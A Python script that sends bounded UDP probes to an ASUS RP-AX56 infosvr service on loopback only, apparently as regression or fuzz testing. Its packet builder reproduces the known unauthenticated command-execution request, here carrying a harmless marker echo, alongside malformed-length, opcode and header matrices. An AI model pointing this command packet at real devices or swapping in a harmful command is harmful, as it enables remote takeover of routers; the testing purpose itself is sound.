#!/usr/bin/env python3
"""Bounded, loopback-only ASUS RP-AX56 infosvr protocol probes."""

from __future__ import annotations

import argparse
import json
import socket
import struct
import time


SERVICE = 12
COMMAND = 21
GETINFO = 31
MANU_COMMAND = 51
PACKET_SIZE = 512


def header(opcode: int) -> bytes:
    return struct.pack("<BBHI", SERVICE, COMMAND, opcode, 0x46524944)


def getinfo_packet() -> bytes:
    return (header(GETINFO) + bytes(PACKET_SIZE))[:PACKET_SIZE]


def command_packet(command: bytes) -> bytes:
    if len(command) > 255:
        raise ValueError("bounded command is too long")
    packet = bytearray(PACKET_SIZE)
    packet[:8] = header(MANU_COMMAND)
    packet[8:14] = b"FRIDAY"
    packet[46:48] = struct.pack("<H", len(command))
    packet[48:48 + len(command)] = command
    return bytes(packet)


def opcode_packet(opcode: int, service: int = SERVICE, packet_type: int = COMMAND) -> bytes:
    packet = bytearray(PACKET_SIZE)
    packet[:8] = struct.pack("<BBHI", service, packet_type, opcode, 0x46524944)
    packet[8:14] = b"FRIDAY"
    return bytes(packet)


def declared_command_length_packet(declared_length: int) -> bytes:
    packet = bytearray(opcode_packet(MANU_COMMAND))
    packet[46:48] = struct.pack("<H", declared_length)
    # An inert payload makes accidental execution harmless if a guard regresses.
    packet[48:] = b":" * (PACKET_SIZE - 48)
    return bytes(packet)


def exchange(port: int, packet: bytes, timeout: float = 0.5) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(packet, ("127.0.0.1", port))
        try:
            response, _ = sock.recvfrom(4096)
        except socket.timeout:
            return b""
        return response


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=9999)
    parser.add_argument(
        "--case",
        choices=(
            "getinfo",
            "historical-rce",
            "malformed-matrix",
            "opcode-matrix",
            "command-length-matrix",
            "header-matrix",
        ),
        required=True,
    )
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("invalid port")

    if args.case == "getinfo":
        cases = [("getinfo", getinfo_packet())]
    elif args.case == "historical-rce":
        cases = [(
            "historical-rce",
            command_packet(b"echo FRIDAY_INFOSVR_MARKER >/tmp/friday-infosvr-marker"),
        )]
    elif args.case == "malformed-matrix":
        sizes = (0, 1, 2, 3, 4, 7, 8, 9, 45, 46, 47, 48, 63, 127, 255, 511)
        cases = [(f"size-{size}", bytes([0x41]) * size) for size in sizes]
    elif args.case == "opcode-matrix":
        opcodes = (0, 1, *range(29, 56), 0xFFFF)
        cases = [(f"opcode-{opcode}", opcode_packet(opcode)) for opcode in opcodes]
    elif args.case == "command-length-matrix":
        lengths = (0, 1, 255, 256, 257, 419, 420, 421, 463, 464, 465, 0xFFFF)
        cases = [
            (f"declared-command-length-{length}", declared_command_length_packet(length))
            for length in lengths
        ]
    else:
        headers = (
            (0, 0),
            (SERVICE, 0),
            (0, COMMAND),
            (SERVICE, COMMAND),
            (0xFF, 0xFF),
        )
        cases = [
            (f"service-{service}-type-{packet_type}", opcode_packet(GETINFO, service, packet_type))
            for service, packet_type in headers
        ]

    results = []
    for name, packet in cases:
        started = time.monotonic()
        try:
            response = exchange(args.port, packet)
            error = None
        except OSError as exc:
            response = b""
            error = f"{type(exc).__name__}: {exc}"
        results.append({
            "name": name,
            "request_bytes": len(packet),
            "response_bytes": len(response),
            "response_prefix_hex": response[:32].hex(),
            "error": error,
            "elapsed_ms": round((time.monotonic() - started) * 1000, 2),
        })
        time.sleep(0.05)
    print(json.dumps({
        "target": f"127.0.0.1:{args.port}/udp",
        "case": args.case,
        "results": results,
    }, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
